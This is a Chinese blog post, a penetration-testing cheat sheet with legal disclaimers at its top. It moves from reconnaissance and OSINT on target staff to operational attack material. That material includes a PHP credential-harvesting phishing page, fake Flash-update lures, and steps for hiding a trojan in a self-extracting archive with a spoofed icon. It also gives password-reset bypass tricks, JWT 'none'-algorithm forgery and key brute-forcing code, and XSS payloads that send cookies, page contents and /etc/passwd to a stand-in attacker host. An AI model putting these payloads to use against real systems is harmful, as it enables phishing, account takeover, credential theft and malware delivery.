<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>知识笔记1 | 猫猫的胡言</title><meta name="keywords" content="知识笔记"><meta name="author" content="猫猫,ptilopsis@rhinelab.top"><meta name="copyright" content="猫猫"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="Pentest_Note声明1：依照《中华人民共和国网络安全法》等相关法规规定，任何个人和组织不得从事非法侵入他人网络、干扰他人网络正常功能、窃取网络数据等危害网络安全的活动；不得提供专门用于从事侵入网络、干扰网络正常功能及防护措施、窃取网络数据等危害网络安全活动的程序、工具；明知他人从事危害网络安全的活动的，不得为其提供技术支持、广告推广、支付结算等帮助。 声明2：以下内容均在本地完成复现，不涉">
<meta property="og:type" content="article">
<meta property="og:title" content="知识笔记1">
<meta property="og:url" content="https://nek0neko.github.io/2022/02/14/%E7%9F%A5%E8%AF%86%E7%AC%94%E8%AE%B01/index.html">
<meta property="og:site_name" content="猫猫的胡言">
<meta property="og:description" content="Pentest_Note声明1：依照《中华人民共和国网络安全法》等相关法规规定，任何个人和组织不得从事非法侵入他人网络、干扰他人网络正常功能、窃取网络数据等危害网络安全的活动；不得提供专门用于从事侵入网络、干扰网络正常功能及防护措施、窃取网络数据等危害网络安全活动的程序、工具；明知他人从事危害网络安全的活动的，不得为其提供技术支持、广告推广、支付结算等帮助。 声明2：以下内容均在本地完成复现，不涉">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://tva4.sinaimg.cn/large/0072Vf1pgy1foxk6v6t1kj31kw0w0e6l.jpg">
<meta property="article:published_time" content="2022-02-14T02:18:55.000Z">
<meta property="article:modified_time" content="2022-02-14T03:36:51.273Z">
<meta property="article:author" content="猫猫">
<meta property="article:tag" content="知识笔记">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://tva4.sinaimg.cn/large/0072Vf1pgy1foxk6v6t1kj31kw0w0e6l.jpg"><link rel="shortcut icon" href="https://cdn.jsdelivr.net/gh/nek0neko/ImageHost/202202051822882.jpg"><link rel="canonical" href="https://nek0neko.github.io/2022/02/14/%E7%9F%A5%E8%AF%86%E7%AC%94%E8%AE%B01/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '知识笔记1',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2022-02-14 11:36:51'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><link rel="stylesheet" href="/css/font.css" media="defer" onload="this.media='all'"><!-- hexo injector head_end start --><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-tag-plugins-plus@latest/lib/assets/font-awesome-animation.min.css" media="defer" onload="this.media='all'"><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-tag-plugins-plus@latest/lib/tag_plugins.css" media="defer" onload="this.media='all'"><script src="https://npm.elemecdn.com/hexo-butterfly-tag-plugins-plus@latest/lib/assets/carousel-touch.js"></script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.0.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://cdn.jsdelivr.net/gh/nek0neko/ImageHost/202202051822882.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data is-center"><div class="data-item"><a href="/archives/"><div class="headline">文章</div><div class="length-num">2</div></a></div><div class="data-item"><a href="/tags/"><div class="headline">标签</div><div class="length-num">1</div></a></div><div class="data-item"><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div></div><hr/></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://tva4.sinaimg.cn/large/0072Vf1pgy1foxk6v6t1kj31kw0w0e6l.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">猫猫的胡言</a></span><div id="menus"><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">知识笔记1</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-02-14T02:18:55.000Z" title="发表于 2022-02-14 10:18:55">2022-02-14</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-02-14T03:36:51.273Z" title="更新于 2022-02-14 11:36:51">2022-02-14</time></span></div><div class="meta-secondline"></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="Pentest-Note"><a href="#Pentest-Note" class="headerlink" title="Pentest_Note"></a>Pentest_Note</h1><h3 id="声明1："><a href="#声明1：" class="headerlink" title="声明1："></a>声明1：</h3><pre><code>依照《中华人民共和国网络安全法》等相关法规规定，任何个人和组织不得从事非法侵入他人网络、干扰他人网络正常功能、窃取网络数据等危害网络安全的活动；不得提供专门用于从事侵入网络、干扰网络正常功能及防护措施、窃取网络数据等危害网络安全活动的程序、工具；明知他人从事危害网络安全的活动的，不得为其提供技术支持、广告推广、支付结算等帮助。
</code></pre><h3 id="声明2："><a href="#声明2：" class="headerlink" title="声明2："></a>声明2：</h3><pre><code>以下内容均在本地完成复现，不涉及任何非法行为，不允许使用本项目所提及的所有技术内容进行非法行为，使用技术的风险由使用者自行承担。
</code></pre><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="Whois"><a href="#Whois" class="headerlink" title="Whois"></a>Whois</h2><pre><code>站点注册人注册过的其他网站(对注册人、邮箱、电话的反查)，对查到的站点的深入
</code></pre><h2 id="网站IP"><a href="#网站IP" class="headerlink" title="网站IP"></a>网站IP</h2><h3 id="是否存在CDN"><a href="#是否存在CDN" class="headerlink" title="是否存在CDN"></a>是否存在CDN</h3><pre><code>Ping、多地ping、国外ping
</code></pre><h3 id="Bypass-cdn常规方式"><a href="#Bypass-cdn常规方式" class="headerlink" title="Bypass cdn常规方式"></a>Bypass cdn常规方式</h3><pre><code>子域名
https://dnsdb.io/zh-cn/
Ping根域名
Nslookup
Cloudflare的真实IP寻找
  http://crimeflare.org:82/cfs.html
  https://github.com/gwen001/pentest-tools/blob/master/cloudflare-origin-ip.py
查找老域名
查找关联域名
  www.baidu.com
  www.baidu.cn
  www.baidu.org
  www.baidu.xyz等等
信息泄露/配置文件
Phpinfo
网页源码
Svn
Github
Shodan/fofa/zoomeye
SSL证书记录
https://censys.io/
网站漏洞
  Xss
  Ssrf
  命令执行
  SQL注入(某种情况loadfile读取linux的ip配置文件，hosts文件等)
DNS记录，证书记录
设置xff/x-remote-ip/x-remote-addr为127.0.0.1/或ipv6地址
RSS订阅/邮件头
APP反编译搜索/截取APP的请求信息
修改hosts文件指向
</code></pre><h2 id="域名历史IP"><a href="#域名历史IP" class="headerlink" title="域名历史IP"></a>域名历史IP</h2><p>  <a target="_blank" rel="noopener" href="https://x.threatbook.cn/">https://x.threatbook.cn/</a></p>
<h2 id="网站架构-服务器指纹-CMS识别-容器"><a href="#网站架构-服务器指纹-CMS识别-容器" class="headerlink" title="网站架构/服务器指纹/CMS识别/容器"></a>网站架构/服务器指纹/CMS识别/容器</h2><pre><code>Whatweb
网页源代码
请求头/响应头
网站底部，顶部，左上角右上角
网站报错信息
http://www.yunsee.cn/
域名/install
Firefox插件Wappalyzer
CMS漏洞
  定位版本对应已知漏洞检查
  CMS未知漏洞挖掘
Web容器已知漏洞(解析漏洞这种)
显示网站使用的技术
  https://builtwith.com/
中间件、组件
Weblogic、tomcat、zabbix、struts、axis等
https://github.com/FortyNorthSecurity/EyeWitness
</code></pre><h2 id="子域名"><a href="#子域名" class="headerlink" title="子域名"></a>子域名</h2><pre><code>老站、同样架构或同源码的子站
爆破，接口查询
  https://phpinfo.me/domain/
  https://d.chinacycc.com/index.php?m=Login&amp;a=index
  subDomainBrute、knockpy
OWA发现、dig adfs、dig mail
https://dns.bufferover.run/dns?q=baidu.com
http://api.hackertarget.com/reversedns/?q=target.com
</code></pre><h2 id="网站使用的CMS的官方demo站"><a href="#网站使用的CMS的官方demo站" class="headerlink" title="网站使用的CMS的官方demo站"></a>网站使用的CMS的官方demo站</h2><pre><code>找不到demo就找源码开发者，加群什么的，结合社会工程学要个后台截图(对于一些后台目录复杂的cms)，注意看网站上一些功能介绍的截图。
</code></pre><h2 id="SSL证书信息"><a href="#SSL证书信息" class="headerlink" title="SSL证书信息"></a>SSL证书信息</h2><pre><code>https://crt.sh/?q=%25.target.com
https://censys.io/certificates?q=target.com
https://github.com/cheetz/sslScrape
</code></pre><h2 id="DNS历史解析记录"><a href="#DNS历史解析记录" class="headerlink" title="DNS历史解析记录"></a>DNS历史解析记录</h2><pre><code>https://dnsdumpster.com/
https://censys.io/
https://securitytrails.com/
域传送漏洞检查
  Dnsenum、fierce
http://ha.ckers.org/fierce/ 
$ ./fierce.pl -dns example.com 
$ ./fierce.pl –dns example.com –wordlist myWordList.txt
&gt;dig @ns.example.com example=.com AXFR 
&gt;nslookup -type=ns xxx.yyy.cn #查询解析某域名的DNS服务器
&gt;nslookup #进入nslookup交互模式
&gt;server dns.domian.com #指定dns服务器
&gt;ls xxx.yyy.cn #列出域信息
</code></pre><h2 id="同服站点情况"><a href="#同服站点情况" class="headerlink" title="同服站点情况"></a>同服站点情况</h2><pre><code>https://site.ip138.com/
火狐插件flagfox,配置单击指向bing查ip对应的域名
</code></pre><h2 id="同样架构或源码的站"><a href="#同样架构或源码的站" class="headerlink" title="同样架构或源码的站"></a>同样架构或源码的站</h2><h2 id="网站js"><a href="#网站js" class="headerlink" title="网站js"></a>网站js</h2><pre><code>https://github.com/003random/getJS
https://github.com/Threezh1/JSFinder
或浏览器F12也可以看到加载的
敏感信息、可能存在漏洞的参数等信息
查看网页源代码，注释的一些信息，比如没有删掉的接口、前台没有的页面、越权、注入、js等
</code></pre><h2 id="网站使用的第三方js"><a href="#网站使用的第三方js" class="headerlink" title="网站使用的第三方js"></a>网站使用的第三方js</h2><h2 id="云信息"><a href="#云信息" class="headerlink" title="云信息"></a>云信息</h2><pre><code>Aliyun、AWS、GCP、Azure等
查找可公开访问的实例
  https://github.com/gwen001/s3-buckets-finder
  https://github.com/nccgroup/aws-inventory
  https://github.com/jordanpotti/AWSBucketDump
</code></pre><h2 id="APP反编译"><a href="#APP反编译" class="headerlink" title="APP反编译"></a>APP反编译</h2><pre><code>url、js、osskey、api等信息查找
搜集到接口该怎么做
  Fuzz常见参数
</code></pre><h2 id="C段-B段信息"><a href="#C段-B段信息" class="headerlink" title="C段/B段信息"></a>C段/B段信息</h2><pre><code>Banner、是否存在目标的后台或其他入口/其他业务系统
</code></pre><h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><pre><code>recon-ng,theharvester,maltego,exiftool等
https://www.spiderfoot.net/
https://github.com/smicallef/spiderfoot
</code></pre><h2 id="端口对外开放情况"><a href="#端口对外开放情况" class="headerlink" title="端口对外开放情况"></a>端口对外开放情况</h2><pre><code>Masscan、scanport等
针对常见的那些端口的利用的常规方法
常见的未授权访问的服务如redis，mongodb等
</code></pre><h2 id="目录扫描-爬虫-慎用"><a href="#目录扫描-爬虫-慎用" class="headerlink" title="目录扫描/爬虫(慎用)"></a>目录扫描/爬虫(慎用)</h2><h2 id="WAF情况识别"><a href="#WAF情况识别" class="headerlink" title="WAF情况识别"></a>WAF情况识别</h2><pre><code>https://github.com/EnableSecurity/wafw00f
做好绕过策略的计划
</code></pre><h2 id="随手测试"><a href="#随手测试" class="headerlink" title="随手测试"></a>随手测试</h2><pre><code>单引号
xx.jpg/.php
admin/123456
万能密码
Heartbleed漏洞
</code></pre><h2 id="搜索引擎"><a href="#搜索引擎" class="headerlink" title="搜索引擎"></a>搜索引擎</h2><pre><code>Google自定义搜索引擎整合的300多个社交网站
  https://cse.google.com/cse?key=AIzaSyB2lwQuNzUsRTH-49FA7od4dB_Xvu5DCvg&amp;cx=001794496531944888666:iyxger-cwug&amp;q=%22%22
Google自定义搜索引擎整合的文件共享网站
  https://cse.google.com/cse/publicurl?key=AIzaSyB2lwQuNzUsRTH-49FA7od4dB_Xvu5DCvg&amp;cx=001794496531944888666:hn5bcrszfhe&amp;q=%22%22
领英用户提取
  https://cse.google.com/cse?cx=001394533911082033616:tm5y1wqwmme
</code></pre><h2 id="Shodan-fofa-zoomeye"><a href="#Shodan-fofa-zoomeye" class="headerlink" title="Shodan/fofa/zoomeye"></a>Shodan/fofa/zoomeye</h2><h2 id="Google-dorks"><a href="#Google-dorks" class="headerlink" title="Google dorks"></a>Google dorks</h2><pre><code> Site,filetype,intitle,inurl,intext等
</code></pre><h2 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h2><pre><code>电话、邮箱，姓名
目录遍历
备份文件
  (www.zip,xx.com.zip,www.xx.com.zip,wwwroot.zip)
.svn/.git/sql/robots/crossdomin.xml/DS_Store等
  https://github.com/lijiejie/ds_store_exp
  https://github.com/admintony/svnExploit
若是论坛ID=1的用户名一般为管理、或查看帖子信息、生成字典
网页上客服的QQ(先判断是企业的还是个人，用处有时不太大，看怎么用，搞个鱼叉什么的)
</code></pre><h2 id="网页缓存"><a href="#网页缓存" class="headerlink" title="网页缓存"></a>网页缓存</h2><pre><code>http://www.cachedpages.com/
</code></pre><h2 id="图片反查"><a href="#图片反查" class="headerlink" title="图片反查"></a>图片反查</h2><pre><code>百度识图、googleimage、tineye
原图查询坐标
</code></pre><h2 id="社交"><a href="#社交" class="headerlink" title="社交"></a>社交</h2><pre><code>QQ、weibo、支付宝、脉脉、领英、咸鱼、短视频、人人、贴吧、论坛
外网信息
有些人喜欢把自己的生活传到外网
  推特、ins、fb等
</code></pre><h2 id="手机号加入通讯录匹配各个APP用户信息"><a href="#手机号加入通讯录匹配各个APP用户信息" class="headerlink" title="手机号加入通讯录匹配各个APP用户信息"></a>手机号加入通讯录匹配各个APP用户信息</h2><h2 id="注册过的网站"><a href="#注册过的网站" class="headerlink" title="注册过的网站"></a>注册过的网站</h2><pre><code>https://www.reg007.com/
https://www.usersearch.org/
</code></pre><h2 id="目标人员的兴趣"><a href="#目标人员的兴趣" class="headerlink" title="目标人员的兴趣"></a>目标人员的兴趣</h2><pre><code>    目标人员的兴趣 注册过的小众论坛，站点
针对此类站点的深入
收集到的用户名，电话等信息生成字典
</code></pre><h2 id="邮箱搜集"><a href="#邮箱搜集" class="headerlink" title="邮箱搜集"></a>邮箱搜集</h2><pre><code>https://hunter.io/
https://github.com/killswitch-GUI/SimplyEmail
</code></pre><h2 id="Exchange"><a href="#Exchange" class="headerlink" title="Exchange"></a>Exchange</h2><pre><code>https://github.com/dafthack/MailSniper
</code></pre><h2 id="验证邮箱是否存在"><a href="#验证邮箱是否存在" class="headerlink" title="验证邮箱是否存在"></a>验证邮箱是否存在</h2><pre><code>https://tools.verifyemailaddress.io/
</code></pre><h2 id="历史泄露过的资料等"><a href="#历史泄露过的资料等" class="headerlink" title="历史泄露过的资料等"></a>历史泄露过的资料等</h2><pre><code>库
https://haveibeenpwned.com/
https://github.com/kernelmachine/haveibeenpwned
</code></pre><h2 id="Github-Gitee等代码托管平台"><a href="#Github-Gitee等代码托管平台" class="headerlink" title="Github/Gitee等代码托管平台"></a>Github/Gitee等代码托管平台</h2><pre><code>https://github.com/dxa4481/truffleHog
https://github.com/lijiejie/GitHack
https://github.com/MiSecurity/x-patrol
https://github.com/az0ne/Github_Nuggests
https://github.com/mazen160/GithubCloner克隆用户的github
</code></pre><h2 id="被入侵网址列表"><a href="#被入侵网址列表" class="headerlink" title="被入侵网址列表"></a>被入侵网址列表</h2><pre><code>http://zone-h.org/archive
wooyun镜像查找目标企业曾出现的漏洞
</code></pre><h2 id="GPS查询"><a href="#GPS查询" class="headerlink" title="GPS查询"></a>GPS查询</h2><pre><code>https://www.opengps.cn/Default.aspx
</code></pre><h2 id="网站URL提取"><a href="#网站URL提取" class="headerlink" title="网站URL提取"></a>网站URL提取</h2><pre><code>http://www.bulkdachecker.com/url-extractor/
</code></pre><h2 id="蜜罐判断-参考一下即可"><a href="#蜜罐判断-参考一下即可" class="headerlink" title="蜜罐判断(参考一下即可)"></a>蜜罐判断(参考一下即可)</h2><pre><code>https://honeyscore.shodan.io/
</code></pre><h2 id="默认密码"><a href="#默认密码" class="headerlink" title="默认密码"></a>默认密码</h2><pre><code>https://default-password.info/
http://routerpasswords.com
</code></pre><h2 id="如需注册"><a href="#如需注册" class="headerlink" title="如需注册"></a>如需注册</h2><pre><code>Sms
  https://www.materialtools.com/
  http://receivefreesms.com/
Email
  https://10minutemail.net/
  https://zh.mytrashmailer.com/
  http://24mail.chacuo.net/enus
  https://www.linshiyouxiang.net/
Fake id
  https://www.fakenamegenerator.com/
  http://www.haoweichi.com/
  https://www.fakeaddressgenerator.com/
</code></pre><h2 id="企业信息"><a href="#企业信息" class="headerlink" title="企业信息"></a>企业信息</h2><pre><code>天眼查、企查查、企业信用信息公示系统
企业邮箱收集，企业架构画像、人员统计、人员职责、部门、WiFi、常用部门密码、人员是否泄露过密码、人员平时爱逛的站点、OA/erp/crm/sso/mail/vpn等入口、网络安全设备（waf,ips,ids,router等统计）、内部使用的代码托管平台(gitlab、daocloud等)，bug管理平台、服务器域名资产统计
</code></pre><h2 id="win10-安装kali-wsl"><a href="#win10-安装kali-wsl" class="headerlink" title="win10 安装kali(wsl)"></a>win10 安装kali(wsl)</h2><pre><code>Microsoft Store查找kali下载。
Powershell执行
&gt;Enable-WindowsOptionalFeature -Online -FeatureName Microsoft-Windows-Subsystem-Linux
源设置vim /etc/apt/source.list
deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free 
deb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free
deb http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free
deb-src http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free
&gt;sudo su
&gt;passwd root修改root密码
&gt;apt-get update &amp;apt-get upgrade 更新
&gt;apt-get dist-upgrade 
&gt;apt-get clean
cmd&gt;kali config --default-user root 设置默认启动用户为root
cmd&gt;net stop/start LxssManager重启服务
&gt;apt-get install metasploit-framework
&gt;apt install kali-linux-full 安装完整kali工具集
</code></pre><h2 id="水坑攻击"><a href="#水坑攻击" class="headerlink" title="水坑攻击"></a>水坑攻击</h2><h3 id="XSS克隆钓鱼"><a href="#XSS克隆钓鱼" class="headerlink" title="XSS克隆钓鱼"></a>XSS克隆钓鱼</h3><pre><code>保存js&amp;css到服务器，登录action改为接受密码的文件action=&quot;./pass.php&quot;
</code></pre><blockquote>
<p>&lt;?php //php<br>      $user=$_POST[‘username’];<br>      $pass=$_POST[‘password’];<br>      $file=fopen(‘pass.txt’,’a+’);<br>      fwrite($file,$user.”|”.”pass” . “\n”);<br>      fclose($file);<br>      echo “<script>window.location.href=\"http://192.168.0.1\"</script>\n”;<br>    ?&gt;<br>    构造payload</p>
<p><script>window.location.href="http://192.168.0.1/login.html"</script><br>    php –S 0.0.0.0:8080 –t ./</p>
<h3 id="伪造页面钓鱼"><a href="#伪造页面钓鱼" class="headerlink" title="伪造页面钓鱼"></a>伪造页面钓鱼</h3><h4 id="1"><a href="#1" class="headerlink" title="1"></a>1</h4><pre><code>https://github.com/r00tSe7en/Fake-flash.cn
添加xss平台模块
window.alert = function(name)&#123;
var iframe = document.createElement(&quot;IFRAME&quot;);
iframe.style.display=&quot;none&quot;;
iframe.setAttribute(&quot;src&quot;,&#39;data:text/plain&#39;);
document.documentElement.appendChild(iframe);
window.frames[0].window.alert(name);
iframe.parentNode.removeChild(iframe);
&#125;
alert(&quot;您的FLASH版本过低，尝试升级后访问该页面！&quot;);
window.location.href=&quot;http://www.flash.com&quot;;
制作自解压捆绑
一个马.exe，一个正常exe，全选，winrar添加到压缩文件，选择创建自解压格式压缩文件，高级-&gt;自解压选项，设置解压路径，c:\windows\temp\，设置-&gt;解压后运行两个exe文件，模式全部隐藏，更新，解压并更新文件，覆盖所有文件。
ResourceHacker修改文件图标
</code></pre><h4 id="2"><a href="#2" class="headerlink" title="2"></a>2</h4><pre><code>  if(empty($_COOKIE[&#39;flash&#39;]))&#123;
      echo &#39;&lt;script&gt;alert(&quot;你当前计算机的Flash软件已经很久未更新，将导致无法正常显示界面内容，请下载安装最新版本！&quot;);window.location=&quot;http://www.flash.cn.xx.com/&quot;&lt;/script&gt;&#39;;
      setcookie(&quot;flash&quot;,&quot;true&quot;,time()+30*2400);
  &#125;
</code></pre><h2 id="对外服务攻击"><a href="#对外服务攻击" class="headerlink" title="对外服务攻击"></a>对外服务攻击</h2><h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h3><h4 id="前端-逻辑漏洞"><a href="#前端-逻辑漏洞" class="headerlink" title="前端/逻辑漏洞"></a>前端/逻辑漏洞</h4><h5 id="注册"><a href="#注册" class="headerlink" title="注册"></a>注册</h5><pre><code>任意用户注册
可爆破用户名
注入
XSS
</code></pre><h5 id="登录"><a href="#登录" class="headerlink" title="登录"></a>登录</h5><pre><code>爆破用户名，密码
注入
万能密码
Xss
Xss+Csrf
修改返回包信息，登入他人账户
修改cookie中的参数，如user,adminid等
</code></pre><h5 id="任意密码重置"><a href="#任意密码重置" class="headerlink" title="任意密码重置"></a>任意密码重置</h5><pre><code>1．重置一个账户，不发送验证码，设置验证码为空发送请求。
2．发送验证码，查看相应包
3．验证码生存期的爆破
4．修改相应包为成功的相应包
5．手工直接跳转到校验成功的界面
6．两个账户，重置别人密码时，替换验证码为自己正确的验证码
7．重置别人密码时，替换为自己的手机号
8．重置自己的成功时，同意浏览器重置别人的，不发验证码
9．替换用户名，ID，cookie，token参数等验证身份的参数
10．通过越权修改他人的找回信息如手机/邮箱来重置
</code></pre><h5 id="信息泄露-1"><a href="#信息泄露-1" class="headerlink" title="信息泄露"></a>信息泄露</h5><pre><code>HTML源码、JS等查看信息搜集一章
</code></pre><h5 id="后台"><a href="#后台" class="headerlink" title="后台"></a>后台</h5><pre><code>登录参数修改为注册参数/reg、/register、/sign等
</code></pre><h4 id="JWT攻击手法"><a href="#JWT攻击手法" class="headerlink" title="JWT攻击手法"></a>JWT攻击手法</h4><pre><code>https://jwt.io/#debugger-io
</code></pre><h5 id="未校验签名"><a href="#未校验签名" class="headerlink" title="未校验签名"></a>未校验签名</h5><pre><code>将原JWT串解码后修改用户名等身份认证的地方，生成新token发送请求
</code></pre><h5 id="禁用哈希"><a href="#禁用哈希" class="headerlink" title="禁用哈希"></a>禁用哈希</h5><p><img src="https://qiniucdn.rhinelab.top/img/20220214/1.png~webp" alt="image"><br></p>
</blockquote>
<pre><code>Alg代表加密方式，修改用户名等身份认证的地方，把HS256设置为none生成token发送请求，使用python的pyjwt模块
</code></pre><p><img src="https://qiniucdn.rhinelab.top/img/20220214/2.png~webp" alt="image"><br></p>
<pre><code>jwt.encode(&#123;&#39;user&#39;:&#39;admin&#39;,&#39;arg1&#39;:&#39;value1&#39;,&#39;arg2&#39;:&#39;value2&#39;&#125;,algorithm=&#39;none&#39;,key=&#39;&#39;)
</code></pre><h5 id="暴破弱密钥"><a href="#暴破弱密钥" class="headerlink" title="暴破弱密钥"></a>暴破弱密钥</h5><pre><code>&gt;pip3 install pyjwt
&gt;python3 crack.py
import jwt
import termcolor

jwt_str = R&#39;token&#39;
with open(&#39;/root/password.txt&#39;) as f:
  for line in f:
  key_ = line.strip()
  try:
    jwt.decode(jwt_str,verify=True,key=key_)
    print(&#39;\r&#39;,&#39;\bfound key --&gt;&#39;,termcolor.colored(key_,&#39;green&#39;),&#39;&lt;--&#39;)
    break
  except(jwt.exceptions.ExpiredSignatureError,jwt.exceptions.InvalidAudienceError,jwt.exceptions.InvalidIssuedAtError,jwt.exceptions.InvalidIssuedAtError,jwt.exceptions.ImmatureSignatureError):
    print(&#39;\r&#39;,&#39;\bfound key --&gt;&#39;,termcolor.colored(key_,&#39;green&#39;),&#39;&lt;--&#39;)
  except jwt.exceptions.InvalidSignatureError:
    print(&#39;\r&#39;,&#39; &#39; * 64, &#39;\r\btry&#39;,key_,end=&#39;&#39;,flush=True)
    continue
else:
  print(&#39;\r&#39;,&#39;\bnot found.&#39;)
</code></pre><h4 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h4><pre><code>打COOKIE
&lt;svg/onload=&quot;javascript:document.location.href=(&#39;http://xx.xx.xx.xx:7777?cookie=&#39;+document.cookie)&quot;&gt;
读取HTML
&lt;svg/onload=&quot;document.location=&#39;http://xx.xx.xx.xx:7777/?&#39;+btoa(document.body.innerHTML)&quot;&gt;
读文件
&lt;svg/onload=&quot;
xmlhttp=new XMLHttpRequest();
xmlhttp.onreadystatechange=function()
&#123;
    if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200)
    &#123;
        document.location=&#39;http://xx.xx.xx.xx:7777/?&#39;+btoa(xmlhttp.responseText);
    &#125;
&#125;
xmlhttp.open(&quot;GET&quot;,&quot;file.php&quot;,true);
xmlhttp.send();
&quot;&gt;
XSS+SSRF读取服务器文件

&lt;svg/onload=&quot;
xmlhttp=new XMLHttpRequest();
xmlhttp.onreadystatechange=function()
&#123;
if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200)
&#123;
    document.location=&#39;http://vps_ip:23333/?&#39;+btoa(xmlhttp.responseText);
&#125;
&#125;
xmlhttp.open(&quot;POST&quot;,&quot;request.php&quot;,true);
xmlhttp.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;);
xmlhttp.send(&quot;url=file:///etc/passwd&quot;);
&quot;&gt;
</code></pre><h4 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h4><pre><code>查看有无token等验证身份的参数，删掉后是否返回正常
查看header中referer,origin参数，删掉后是否返回正常
使用csrftester/burpsuite生成表单，以另一账号和浏览器打开测试
去掉referer中域名后面的文件夹或文件
替换二级域名
</code></pre><h4 id="php任意文件读取-下载"><a href="#php任意文件读取-下载" class="headerlink" title="php任意文件读取/下载"></a>php任意文件读取/下载</h4><pre><code>readfile()、file_get_contents()、fopen()等读文件的函数不严谨，读取文件路径可控，输出内容。
下载配置文件
Redis、Weblogic、ftp、mysql、web配置文件、history文件、数据库配置文件
下载log文件
